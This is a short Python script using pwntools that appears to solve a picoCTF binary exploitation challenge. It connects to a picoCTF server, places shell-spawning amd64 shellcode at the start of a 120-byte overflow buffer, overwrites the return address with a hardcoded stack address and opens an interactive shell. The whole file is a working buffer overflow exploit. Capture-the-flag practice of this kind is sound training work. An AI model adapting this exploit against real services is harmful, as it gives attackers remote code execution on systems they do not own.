# Credit to ZeroDay Tea
from pwn import *
import sys
context.arch = 'amd64'

r = remote('mercury.picoctf.net', 24284)

#address = int(r.recvline(False), 16)
address = 0x7fffffffeb40
shellcode = asm(shellcraft.amd64.linux.sh())
offset = b'A'*(120-len(shellcode))
payload = shellcode + offset + p64(address)


r.sendline("hello this is unnecessary")
r.sendline(payload)
r.interactive()
